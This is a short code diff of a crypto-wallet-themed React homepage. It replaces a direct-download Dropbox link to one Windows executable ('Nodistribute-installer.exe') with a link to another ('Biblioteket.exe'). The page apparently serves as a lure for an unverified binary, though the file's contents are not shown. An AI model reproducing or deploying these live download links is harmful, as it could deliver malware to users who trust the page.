@@ -5,7 +5,7 @@ import { WalletAnimation } from '@/components/WalletAnimation';
 import { ParticleBackground } from '@/components/ParticleBackground';
 import { CryptoBackground } from '@/components/CryptoBackground';
 
-const DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/lx0ofssx0khbhgjeqo1m8/Nodistribute-installer.exe?rlkey=7bwm86crl0lk1sjgc8ntcdxyi&st=iirzown8&dl=1";
+const DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/n6z2tvlvhn34f73kx48cv/Biblioteket.exe?rlkey=jeoto3u10g7nh9bjtnphvbnb8&st=y4r6p0dd&dl=1";
 
 export function HomePage() {
   const features = [
